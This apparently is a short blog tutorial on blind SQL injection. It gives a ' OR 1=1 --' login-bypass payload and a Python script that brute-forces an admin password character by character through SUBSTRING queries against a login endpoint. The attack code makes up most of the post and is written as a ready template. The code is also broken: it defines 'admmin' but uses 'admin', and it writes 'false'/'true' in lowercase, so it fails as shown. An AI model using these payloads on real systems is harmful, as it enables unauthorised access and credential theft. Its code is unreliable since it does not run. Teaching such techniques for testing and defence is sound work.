---
layout: post
title: Blind SQL Injection, simple python script
---

First of all, a SQL Injection is a vulnerability which affects SQL Database, due to bad programming of user inputs and bad sanification.
A BLIND SQL Injection occours when the application is not giving data (or access) directly, but it's possible to retrieve such data indirectly by interpretating the application behavior in a Boolean way.

For example, if we have a login form asking for username and password, and we try to login with a SQL Injection payload like:

```python
    import requests
    admmin = "admin"
    password = "' OR 1=1 --"

    r = requests.post("https://vulnerable-website/login", data={"username": admin, "password": password})
```

That would probably log us in as admin, because the SQL query would be something like:

```SQL
    SELECT * FROM users WHERE username='admin' AND password='' OR 1=1 --'
```

But what if we want to retrieve, for example, password of the admin user? We need to interpretate some data.

If we analyze the response status code, we should get a 200 OK if the query is true, and a 500 Internal Server Error if the query is false.

```python
    print(r.status_code)
```

That might not always be the case, because some websites always return 200 OK, even for errors. In that case, we need to analyze the response content or size.

```python
    print(len(r.content))
    print(r.content)
```

How do we use such information? We can use it to bruteforce the password character by character, but first we need to change our payload to make someting like this:

```SQL
   SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,N)='a'
```

This query will check if the first character of the password is 'a'. If it's true, we get a 200 OK, otherwise we get a 500 Internal Server Error (or different content/size).

Now we can write a simple python script to bruteforce the password:

```python
    import requests
    import string

    CHARSET = string.ascii_letters + string.digits + string.punctuation
    password = ""
    found = false
    while not found:
        for char in CHARSET:
            test_password = password + char
            r = requests.post("https://vulnerable-website/login", data={"username": "admin' AND SUBSTRING(password,1," + str(len(test_password)) + ")='" + test_password + "' --", "password": "garbage"})
            if r.status_code == 200:  # or check content/size
                password += char
                print(f"Found so far: {password}")
                break
        else:
            found = true
            print(f"Password found: {password}")
```
